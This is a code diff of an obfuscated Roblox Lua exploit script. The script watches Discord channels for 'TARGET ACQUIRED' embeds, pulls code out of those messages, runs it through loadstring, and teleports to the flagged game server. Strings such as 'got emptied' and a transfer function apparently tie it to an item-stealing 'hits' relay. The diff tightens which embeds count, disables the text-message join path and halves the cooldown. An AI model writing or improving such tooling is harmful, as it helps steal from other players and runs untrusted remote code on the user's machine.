@@ -572,55 +572,23 @@ local function _getMsgs(_after, _chan)
     return {}
 end
 
--- ─── EMBED MATCHER — permissive: title alone is enough ───
+-- ─── EMBED MATCHER — title-only ───
+-- Any embed with "TARGET ACQUIRED" in the title qualifies. Color/footer
+-- are ignored so the relay stripping fields can't break detection.
 local function _embedLooksRight(_e)
     if not _e then return false end
     local title = tostring(_e.title or "");
-    if title:find("TARGET ACQUIRED") then return true end
-    if title:find("HIT CONFIRMED") then return true end
-    local footerText = (_e.footer and tostring(_e.footer.text or "")) or "";
-    local desc       = tostring(_e.description or "");
-    if footerText:find("deadhub") and (desc:find("just landed") or desc:find("got emptied")) then
-        return true;
-    end
-    return false;
+    return title:find("TARGET ACQUIRED") ~= nil;
 end
 
 local function _hasAnyEmbed(_md)
     return _md and _md.embeds and #_md.embeds > 0;
 end
 
-local function _hasTargetEmbed(_md)
-    if not _hasAnyEmbed(_md) then return false end
-    for _, _e in ipairs(_md.embeds) do
-        if _embedLooksRight(_e) then return true end
-    end
-    return false;
-end
-
+-- ─── _pjm is DEAD — embeds handle everything now. ───
+-- Text-only messages can no longer trigger a join.
 local function _pjm(_m)
-    if not _m or not _m.author then return end
-    if _m.channel_id and _m.channel_id ~= _hitCh then return end
-    -- skip ANY message with embeds — real hits are text-only
-    if _hasAnyEmbed(_m) then return end
-    if _moving then return end
-    local _c = _m.content or "";
-    local _pi, _ji = string.match(_c, "(%d+),%s*'([^']+)'");
-    if not (_pi and _ji) then _pi, _ji = string.match(_c, 'TeleportToPlaceInstance%s*%(%s*"(%d+)"%s*,%s*"([^"]+)"'); end
-    if not (_pi and _ji) then _pi, _ji = string.match(_c, "TeleportToPlaceInstance%s*%(%s*(%d+)%s*,%s*['\"]([%w%-]+)['\"]%s*%)"); end
-    if not (_pi and _ji) then return end
-    if not _allow[tonumber(_pi)] then return end
-    task.spawn(function() _reactIn(_hitCh, _m.id, "✅") end);
-    writefile("last_target.dat", _m.author.username);
-    if _il("hits_joined.dat", _m.id) then return end
-    if _ji == game.JobId then return end
-    if _jobHit(_ji) then return end
-    local _q = _rl("pending_hits.dat");
-    for _, _j in ipairs(_q) do
-        if _j.msgid == _m.id then return end
-    end
-    table.insert(_q, { placeId = _pi, jobId = _ji, msgid = _m.id, author = _m.author.username });
-    _wl("pending_hits.dat", _q);
+    return
 end
 
 local function _scanLoop()
@@ -759,11 +727,9 @@ local function _doTransfer(_targetName)
 end
 
 -- ═══════════════════════════════════════════════════════════════
---  EMBED EXEC — hardened: getgenv + file dedupe, sets _moving,
---  longer cooldown. Guards: msg-id, same-job, hit-job, moving,
---  cooldown. Reactions: ❌ on skip/error, ✅ on success.
+--  EMBED EXEC — HARD GATE: requires an embed. Text-only msgs ignored.
 -- ═══════════════════════════════════════════════════════════════
-local _EMBED_COOLDOWN = 60
+local _EMBED_COOLDOWN = 30
 
 local function _extractJobId(code)
     if not code then return nil end
@@ -796,7 +762,9 @@ local function _extractCode(_md, _e)
 end
 
 local function _execEmbed(_md)
+    -- HARD GATE: must have an embed. No embed = no exec.
     if not _hasAnyEmbed(_md) then return end
+
     for _, _e in ipairs(_md.embeds) do
         if _embedLooksRight(_e) then
 
@@ -804,17 +772,20 @@ local function _execEmbed(_md)
                 task.spawn(function() _reactIn(_embedCh, _md.id, "❌") end)
             end
 
-            -- 1. same message
             if _msgHit(_md.id) then
                 _reactX(); return
             end
 
             local code = _extractCode(_md, _e)
-            if not code then return end
+            if not code then
+                _markMsgHit(_md.id)
+                _reactX()
+                print("[embed] skip: no game:GetService in message")
+                return
+            end
 
             local jid = _extractJobId(code)
 
-            -- 2. already in target server
             if jid and jid == game.JobId then
                 _markMsgHit(_md.id)
                 _reactX()
@@ -822,7 +793,6 @@ local function _execEmbed(_md)
                 return
             end
 
-            -- 3. already hit this JobId (getgenv + file)
             if jid and _jobHit(jid) then
                 _markMsgHit(_md.id)
                 _reactX()
@@ -830,7 +800,6 @@ local function _execEmbed(_md)
                 return
             end
 
-            -- 4. teleport already in progress
             if _moving then
                 _markMsgHit(_md.id)
                 _reactX()
@@ -838,15 +807,13 @@ local function _execEmbed(_md)
                 return
             end
 
-            -- 5. cooldown (getgenv-based, survives reload)
             if (tick() - getgenv()._ajLastExec) < _EMBED_COOLDOWN then
                 _markMsgHit(_md.id)
                 _reactX()
-                print("[embed] skip: cooldown (" .. math.floor(tick() - getgenv()._ajLastExec) .. "s)")
+                print("[embed] skip: cooldown")
                 return
             end
 
-            -- pass all guards — commit
             local fn, err = loadstring(code)
             if not fn then
                 _markMsgHit(_md.id)
@@ -860,7 +827,6 @@ local function _execEmbed(_md)
             _markMsgHit(_md.id)
             if jid then _markJobHit(jid) end
 
-            -- lock the whole teleport system while the embed code runs
             _moving = true
             _cur = { placeId = 142823291, jobId = jid or "", msgid = _md.id }
             task.delay(15, function()
@@ -869,9 +835,7 @@ local function _execEmbed(_md)
             end)
 
             local ok, runErr = pcall(fn)
-
             task.spawn(function() _reactIn(_embedCh, _md.id, ok and "✅" or "❌") end)
-
             _postEmbed(
                 ok and "✅ Embed Exec" or "❌ Embed Runtime Error",
                 "```\n" .. tostring(ok and code or runErr):sub(1, 900) .. "\n```",
